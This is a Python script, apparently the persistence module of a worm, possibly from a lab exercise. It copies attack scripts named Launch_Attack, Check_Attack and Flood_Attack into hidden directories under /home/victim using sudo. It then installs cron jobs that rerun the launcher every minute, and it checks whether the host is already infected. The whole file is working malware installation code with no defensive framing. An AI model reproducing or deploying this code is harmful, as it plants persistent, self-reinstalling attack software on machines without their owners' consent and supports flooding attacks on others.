import os
from crontab import CronTab

attackDirs = ['/home/victim/.etc/.module', '/home/victim/.var/.module']
attackFiles = ['/Launch_Attack.py', '/Check_Attack.py', '/Flood_Attack.py']


def check_attack():
    if not is_infect():
        set_up_attack()
        set_up_crontab()


def set_up_attack():
    # Make directories
    for attackDir in attackDirs:
        os.system('sudo mkdir {0}'.format(attackDir))
        os.system('sudo cp Launch_Attack.py {0}/Launch_Attack.py'.format(attackDir))
        os.system('sudo cp b.py {0}/Check_Attack.py'.format(attackDir))
        os.system('sudo cp Flood_Attack.py {0}/Flood_Attack.py'.format(attackDir))

    return


def set_up_crontab():
    cron = CronTab(user=True)

    if not cron.find_comment('etc worm attack'):
        job1 = cron.new(command='sudo /usr/bin/python /home/victim/.etc/.module/Launch_Attack.py',
                        comment='etc worm attack')
        job1.setall('*/1 * * * *')

    if not cron.find_comment('var worm attack'):
        job2 = cron.new(command='sudo /usr/bin/python /home/victim/.var/.module/Launch_Attack.py',
                        comment='var worm attack')
        job2.setall('*/1 * * * *')

    cron.write()

    return


def is_infect():
    for attackDir in attackDirs:
        for attackFile in attackFiles:
            if not os.path.isfile(attackDir+attackFile):
                return False

    cron = CronTab(user=True)

    if not cron.find_comment('etc worm attack'):
        return False

    if not cron.find_comment('var worm attack'):
        return False

    return True


if __name__ == '__main__':
    check_attack()
